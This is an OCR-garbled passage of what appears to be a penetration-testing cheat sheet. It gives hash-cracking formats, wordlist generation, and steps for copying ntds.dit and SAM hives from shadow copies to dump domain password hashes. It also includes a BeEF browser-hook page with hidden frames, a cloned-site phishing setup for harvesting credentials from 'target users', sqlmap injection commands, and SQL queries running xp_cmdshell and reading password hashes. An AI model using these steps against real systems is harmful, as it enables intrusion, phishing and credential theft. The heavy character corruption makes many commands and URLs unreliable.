username:ROOT
$1194E38F1489F3F8DA18181F14DE8-0E-8DCC239
$ john --format~sha1-gen
$SHA1p$salt$59b3e8d63-cf9"edbe2384cf59cb"453dfe30-89
username:$SHA1p$salt$59b3e8d63-cf9"edbe2384cf59cb-453dfe30-89
$ john --format~zip
$zip$'0'1'8005b1b"d07""08d'dee4
username:$zip$'0'1'8005b1b-d0"-"08d'dee4
PASSWORD WORDLIST
GENERATE WORDLIST BASED OFF SINGLE WORD
#Add lower(@), upper(,), ~umber(%), and symbol( I to the end of the word
crunch 12 12 -t baseword@,%' wordlist.txt
Use custom special character set and add 2 numbers then special character
maskprocessor -custom-charset1~\!\@\#\$ baseword?d?d?l wordlist.txt
62
VSSOWN [2l
1. Download: http://ptscripts.googlecode.com/svn/trunk/windows/vssown.vbs
2. Create a new Shadow Copj
a. cscript vssown.vbs /start (optional)
b. cscript vssown.vbs /create
3. Pull the following files frorr. a shadow copj:
a. COpj
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopj[X]\windows\
ntds\ntds.dit .
b. copj
\\?\GLOBALROOT\Device\Harddisf:VolumeShadowCopj[X]\windows\
Sjstem32\config\SYSTEM .
C. COpj
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopj[X]\windows\
sjstem32\con:'ig\SAt1 .
4. Copj files to attack box.
5. Download tools: http://www.ntdsx~ract.com/downloads/ntds dump_hash.zip
6. Configure and Make source code for libesedb from the extracted package
a. cd libesedb
b. chmod +x configure
c. ./configure && make
Use esedbdumphash to ex~ract the datatable from ntds.dit.
a. cd esedbtools
b. . I esedbdumphash .. I .. I ntds. di t
8. 8a.Use dsdump.pj to dump hashes from datatable using bootkej from
SYSTEt1 hive
a. cd .. I .. I creddump/
b. pjthon . /dsdurr.p.pj .. /SYSTEtc
.. /libesedb/esedbtools/ntds.dit.export/datatable
9. 8b.Use bkhive and samdump2 to dump hashes from SN1 using bootkej from
SYSTEt1 hive.
a. bkhive SYSTEM kej.txt
b. samdump2 SN1 kej. txt
10. Dump historical hashes
a. pjthon ./dsdumphistorj.pj .. /sjstem
.. /libesedb/esedbtools/ntds.dit.export/datatable
63
FILE HASHING
HASH LENGTHS
t1D5 16 b:~tes
SHA-1 20 b:~tes
SHA-256 32 b:~tes
SHA-512 64 bjtes
SOFTWARE HASH DATABASE
http://isc.sans.edu/tools/hashsearch.htm~
# dig +short md5 .md5.dshield.org TXT
Result = '' filename I source '' i.e. ''cmd.exe I NIST''
MALWARE HASH DATABASE
http: I /www. team-c:~mru. org/ Services/t1HR
# dig +short [t1D51 SHA-1] .malware.hash.cjmrc.J.com TXT
Result = last seen timestamp AV detection rate
Convert timestamp= perl-e 'print scalar localtime( timestamp ) , ''\n'''
FILE METADATA SEARCH
https://fileadvisor.bit9.com/services/search.aspx
SEARCH VIRUSTOTAL DATABASE
https://www.virustotal.com/#search
64
COMMON USER-AGENT STRINGS
Mozilla/4.0 (compatible; MSIE 6.0; Windows IE 6.0/WinXP 32-bit
NT 5.1; SV1)
Mozilla/ 4. 0 (compatible; l~SIE 7. 0; Windows IE ~.0/WinXP 32-bit
NT 5.1; SV1; .NET CLR 2.0.50-27)
Mozilla/4.0 (compatible; MSIE 8.0; Windows IE 8.0/WinVista 32-bit
NT 6.0; Trident/4.0; Mozilla/4.0
(compatible; MSIE 6.0; Windows NT 5.1; SV1)
; .NET CLR 3.5.30729)
Mozilla/ 5. 0 (compatible; t~SIE 9. 0; Windows IE 9.0/Win- 32-bit
NT 6.1; Trident/5.0)
Mozilla/5.0 (compatible; t~SIE 9.0; Windows IE 9.0/Win- 64-bit
NT 6.1; WOW64; Trident/5.0)
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Firefox 5.0/Win~ 64-bit
Gecko/20100101 Firefox/5.0
Mozilla/5.0 (Windows NT 5.1; rv:13.0) Firefox 13.0/WinXP 32-bit
Gecko/20100101 Firefox/13.0.1
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:1'.01 Firefox 1'.0fWin~ 64-bit
Gecko/20100101 Firefox/1'.0
Mozilla/5.0 (X11; Ubuntu; Linux x86 64; Firefox 1-.o/Linux
rv:17.0) Gecko/20100101 Firefox/1-.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.-; Firefox 1'.0fMacOSX 10.-
rv: 17. 0) Gecko/20100101 Firefox/17.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; Fire fox 1'. Ofl~acOSX 10.8
rv:17.0) Gecko/20100101 Firefox/1'.0
Mozilla/5.0 (Windows NT 5.1) Chrome Generic/WinXP
AppleWebKit/53'.11 (KHTML, like Gecko)
Chrome/23.0.1271.9- Safari/53-.11
Mozilla/5.0 (Windows NT 6.1) Chrome Generic/Win'
AppleWebKit/537 .11 (KHTl~L, like Gecko)
Chrome/23.0.12-1.9- Safari/53-.11
Mozilla/5.0 (X11; Linux x86 64) Chrome Generic/Linux
AppleWebKit/53' .11 (KHTl~L, like Gecko)
Chrome/23.0.1271.9' Safari/537.11
Mozilla/5.0 (Macintosh; Intel Mac OS X Chrome Generic/l~acOSX
10 8 2) AppleWebKit/537.11 (KHTML, like
Ge~ko) Chrome/23.0.12-1.101 Safari/53'.11
Mozilla/5.0 (Windows NT 6.1; WOW64) Chrome 13.0/Win' 64-bit
AppleWebKit/535.1 (KHTML, like Gecko)
Chrome/13.0.782.112 Safari/535.1
Mozilla/5.0 (Macintosh; Intel Mac OS X Safari 6.0/MacOSX
10 ~ 5) AppleWebKit/536.26.17 (KHTML, like
Ge~ko) Version/6.0.2 Safari/536.26.17
Mozilla/5.0 (iPad; CPU OS 6 0 1 like Mac OS Mobile Safari 6.0/iOS (iPad)
X) AppleWebKit/536.26 (KHTML,-like Gecko)
Version/6.0 Mobile/10A523 Safari/8536.25
Mozilla/5.0 (iPhone; CPU iPhone OS 6 0 1 Mobile Safari 6.0/iOS
like l~ac OS X) AppleWebKit/536.26 (KHTML, (iPhone)
like Gecko) Version/6.0 Mobile/10A523
Safari/8536.25
Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Hobile Safari 4.0/Android
Desire A8181 Build/FRF91) App3leWebKit/53.1
(KHTl~L-;- like Gecko I Version/ 4. 0 Mobile
Safari/533.1
67
HTML
HTML BEEF HOOK WITH EMBEDDED FRAME
!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
html
head.
title Campaign Title· /title
script
var commandModuleStr = ' script src=111 + window.location.protocol +
'II' + window. location. host + ':8080/hook.js"
type="text/javascript" \/script.';
document.write(commandModuleStr);
//Site refresh=window.setTimeout(function() {window.location.href='http://ww
w.google.com/'},20000);
/script.
/head
frameset rows="*,lpx"
frame src="http://www.google.com/" frameborder=O
noresize=''noresize'' I
frame src=''/e'' frarneborder=O scrolling=no noresize=noresize ;,
/frameset
/html
EMBEDDED JAVA APPLET (* PLACE WITHIN  TAG)
applet archive=''legit.jar'' code=''This is a legit applet'' width=''l''
height="l" /applet
EMBEDDED IFRAME
iframe src="http://1.1.1.111 width="O" height="O" frameborder="O"
tabindex=''-1'' title=''ernpty'' style=visibility:hidden;display:none''
/iframe
FIREFOX TYPE CONVERSIONS
ASCII Base64 javascript:btoa(''ascii str'')
Base64 ASCII javascript:atob("base64==")
ASCII URI javascript:encodeURI('' ·script ''}
URI ASCII javascript:decodeURI("%3cscript%3E")
WGET
CAPTURE SESSION TOKEN
wget -q --save-cookies=cookie.txt --keep-session-cookies --post
data="username: admin&password=pass&Login=Login" http: I I .. url ,. I login. php
68
CURL
GRAB HEADERS AND SPOOF USER AGENT
curl -I -X HEAD -A "t~ozilla/5.0 (compatible; HSIE ".01; Windows NT 5.0)"
http:// ip
SCRAPE SXTE AFTER LOGXN
curl -u user:pass -o outfile https://login.bob.com
FTP
curl ftp://user:PI:EMAIL/directory/
SEQUENTXAL LOOKUP
curl http://bob.com/file[l-10] .txt
BASIC AUTHENTICATION USING APACHE2
The steps below will clone a website and redirect after 3 seconds to
another page requiring basic authentication. It has proven very useful for
collecting credentials during social engineering engagements.
1. Start Social Engineering Toolkit (SET)
/pentest/exploits/set/./set
2. Through SET, use the 'Website Attack Vector' menu to clone your
preferred website. ' Do not close SET '
3. In a new terminal create a new directory (lowercase L)
mkdir /var/www/1
4. Browse to SET directory and copy the cloned site
cd /pentest/exploits/set/src/web clone/site/template/
cp index.html /var/www/index.html
cp index.html /var/www/1/index.html
5. Open /var/www/index.html and add tag between head tags
meta http-equiv=''refresh''
content-"3;url-http:// domainlip /1/index.html"/
6. Create blank password file to be used for basic auth
touch /etc/apache2/.htpasswd
Open /etc/apache2/sites-available/default and add:
Directory /var/www/1
AuthType Basic
AuthName "PORTAL LOGIN BANNER"
AuthUserFile /etc/apache2/.htpasswd
Require user test
/Directory
8. Start Apache2
/etc/init.d/apache2 start
9. Start Wireshark and add the filter:
http.authbasic
10. Send the following link to your target users
http:// domainlip /index.html
69
AUTOMATED WEB PAGE SCREENSHOTS
NMAP WEB PAGE SCREENSHOTS[9]
Install dependencies:
wget http://wkhtmltopdf.googlecode.com/files/wkhtmltoimage-0.11.0 rc1-
static-i386.tar.bz2
tar -jxvf wkhtmltoimage-0.11.0 rc1-statlc-i386.tar.bz2
cp wkhtmltoimage-i386 /usr/local/bin/
Install Nmap module:
git clone git://github.com/SpiderLabs/Nmap-Tools.git
cd Nmap-Tools/NSE/
cp http-screenshot.nse /usr/local/share/nmap/scripts/
nmap --script-updatedb
OS/version detection using screenshot script (screenshots saved as .png):
nmap -A -script=http-screenshot -p80,443 1.1.1.0/24 -oA nmap-
screengrab
Script will generate HTML preview page with all screenshots:
#!/bin/bash
printf " HTHL.- BODY BR " preview.html
ls -1 '.png I awk -F : ' {print $1":"$2"\n BR- IMG SRC=\""$1"%3A"$2"\"
width=400 BR BR ")' preview. html
printf " /BODY /HTML. " preview. html
PEEPINGTOM WEB PAGE SCREENSHOTS
Install Dependencies:
Download Phantomjs
https://phantomjs.googlecode.com/files/phantomjs-1.9.2-linux-x86_64.tar.bz2
Download PeepingTom
git clone https://bitbucket.org/LaNMaSteR53/peepingtom.git
Extract and copy phantomjs from phantomjs-1.9.2-linux-x86 64.tar.bz2 and
copy to peepingtom directory
Run PeepingTom
python peepingtom.py http:// mytarget.com
70
SQLMAP
GET REQUEST
./sqlmap.py -u "http:// url ?id=1&str=val"
POST REQUEST
./sqlmap.py -u "http:// url " --data="id=1&str=val"
SQL INJECTION AGAINST SPECIFIC PARAMETER WITH DB TYPE SPECIFIED
./sqlmap.py -u ''http:// url '' --data=''id=l&str=val'' -p ''id''
-b --dbms=" mssqllmysqlloraclelpostgres "
SQL INJECTION ON AUTHENTICATED SITE
1. Login and note cookie value (cookie1=val1, cookie2=val2)
./sqlrnap.py -u ''http://· url '' --data=''id=l&str=val'' -p ''id''
--cookie=''cookiel=vall;cookie2=val2''
SQL INJECTION AND COLLECT DB VERSION 1 NAME 1 AND USER
./sqlmap.py -u "http:// url " --data="id=1&str=val" -p "id" -b --current-db
--current-user
SQL INJECTION AND GET TABLES OF DB=TESTDB
./sqlmap.py -u "http:// url " --data="id=1&str=val" -p "id" --tables -D
11testdb11
•
SQL INJECTION AND GET COLUMNS OF USER TABLE
./sqlrnap.py -u "http:// url " --data="id=l&str=val" -p "id11 --columns -T
"users"
71
,_ N
MS-SQL
SELECT @@version DB version
EXEC xp_msver Detailed version info
EXEC master .. xp_cmdshell 'net user' Run OS command
SELECT HOST_ NA11E () Hostname & IP
SELECT DB_ NA11E I) Current DB
SELECT name FROM master .. sysdatabases; List DBs
SELECT user name() Current user
SELECT name FROM master .. sjslogins List users
SELECT name FROM master .. sjsobjects WHERE List tables
Xtjpe= 'U';
SELECT name FROM SjScolumns WHERE id-(SELECT List columns
id FR0t1 SJSObj ects WHERE name-'mjtable' ) ;
SYSTEM TABLE CONTAINING INFO ON ALL TABLES
SELECT TOP 1 TABLE NAME FROl1 INFORl1ATION SCHEt1A. TABLES
LIST ALL TABLES/COLUMNS
SELECT name FROl-1 Sjscol-:;:r.ns WHERE id (SELECT id FROM Sjsobjects WHERE
name= 'mjtable')
PASSWORD HASHES (2005)
SELECT name, password hash FROM master.sjs.sgl logins
POSTGRES
SELECT inet server_addr() Hostname & IP
SELECT current database(); Current DB
SELECT datname FROM pg database; List DBs
SELECT user; Current user
SELECT username FROM pg_user; List users
SELECT username,passwd FROM pg shadow List password hashes